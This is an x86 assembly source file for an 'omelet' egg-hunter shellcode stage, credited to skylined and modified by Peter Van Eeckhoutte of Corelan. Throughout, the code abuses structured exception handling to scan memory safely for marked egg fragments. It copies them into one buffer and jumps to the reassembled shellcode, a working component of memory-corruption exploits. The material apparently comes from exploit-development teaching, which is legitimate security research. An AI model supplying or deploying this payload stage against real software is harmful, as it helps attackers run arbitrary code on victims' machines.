BITS 32

; egg:
; LL II M1 M2 M3 DD DD DD ... (LL * DD)
; LL == Size of eggs (same for all eggs)
; II == Index of egg (different for each egg)
; M1,M2,M3 == Marker byte (same for all eggs)
; DD == Data in egg (different for each egg)

; Original code by skylined
; Code tweaked by Peter Van Eeckhoutte
; peter.ve[at]corelan.be
; http://www.corelan.be:8800

marker equ 0x280876
egg_size equ 0x3
max_index equ 0x2
start:
  ;XOR     EDI, EDI
  mov ebx,0xffffffff-egg_size+1 ; ** Added : put initial counter in EBX
  jmp     SHORT reset_stack

create_SEH_handler:
  PUSH    ECX                     ; SEH_frames[0].nextframe == 0xFFFFFFFF
  MOV     [FS:EAX], ESP           ; SEH_chain -> SEH_frames[0]
  CLD                             ; SCAN memory upwards from 0
scan_loop:
  MOV     AL, egg_size            ; EAX = egg_size
egg_size_location equ $-1 - $$
  REPNE   SCASB                   ; Find the first byte
  PUSH    EAX                     ; Save egg_size
  MOV     ESI, EDI
  LODSD                           ; EAX = II M2 M3 M4
  XOR     EAX, (marker << 8) + 0xFF  ; EDX = (II M2 M3 M4) ^ (FF M2 M3 M4)  == egg_index
marker_bytes_location equ $-3 - $$
  CMP     EAX, BYTE max_index     ; Check if the value of EDX is < max_index
max_index_location equ $-1 - $$
  JA      reset_stack             ; No -> This was not a marker, continue scan
  POP     ECX                     ; ECX = egg_size
  IMUL    ECX                     ; EAX = egg_size * egg_index == egg_offset
  ; EDX = 0 because ECX * EAX is always less than 0x1,000,000
  ADD     EAX, [BYTE FS:EDX + 8]   ; EDI += Bottom of stack ==  position of egg in shellcode.
  XCHG    EAX, EDI
copy_loop:
  REP     MOVSB                   ; copy egg to basket
  CMP     EBX, 0xFFFFFFFF         ; ** Added : see if we have found all eggs
  JE      done                    ; ** Added : If we have found all eggs,** jump to shellcode
  INC     EBX                     ; ** Added : increment EBX (if we are not at the end of the eggs)
  MOV     EDI, ESI                ; EDI = end of egg

reset_stack:
; Reset the stack to prevent problems cause by recursive SEH handlers and set
; ourselves up to handle and AVs we may cause by scanning memory:
  XOR     EAX, EAX                ; EAX = 0
  MOV     ECX, [FS:EAX]           ; EBX = SEH_chain => SEH_frames[X]
find_last_SEH_loop:
  MOV     ESP, ECX                ; ESP = SEH_frames[X]
  POP     ECX                     ; EBX = SEH_frames[X].next_frame
  CMP     ECX, 0xFFFFFFFF         ; SEH_frames[X].next_frame == none ?
  JNE     find_last_SEH_loop      ; No "X -= 1", check next frame
  POP     EDX                     ; EDX = SEH_frames[0].handler
  CALL    create_SEH_handler      ; SEH_frames[0].handler == SEH_handler

SEH_handler:
  POPA                            ; ESI = [ESP + 4] -> struct exception_info
  LEA     ESP, [BYTE ESI+0x18]    ; ESP = struct exception_info->exception_addr
  POP     EAX                     ; EAX = exception address 0x????????
  OR      AX, 0xFFF               ; EAX = 0x?????FFF
  INC     EAX                     ; EAX = 0x?????FFF + 1 -> next page
  JS      done                    ; EAX > 0x7FFFFFFF ===> done
  XCHG    EAX, EDI                ; EDI => next page
  JMP     reset_stack
done:
  XOR     EAX, EAX                ; EAX = 0
  CALL    [BYTE FS:EAX + 8]       ; EDI += Bottom of stack == position of egg in shellcode.

    db      marker_bytes_location
    db      max_index_location
    db      egg_size_location